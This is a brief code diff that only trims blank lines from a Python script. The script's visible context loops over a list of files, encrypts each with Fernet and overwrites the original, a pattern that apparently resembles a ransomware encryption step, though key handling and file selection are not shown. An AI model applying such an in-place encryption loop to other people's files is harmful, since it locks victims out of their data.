@@ -1,4 +1,3 @@
-
 import os
 import sys
 import subprocess
@@ -65,5 +64,3 @@ for file in files:
         encrypted = Fernet(key).encrypt(content)
         with open(file, "wb") as encr_file:
             encr_file.write(encrypted)
-
-
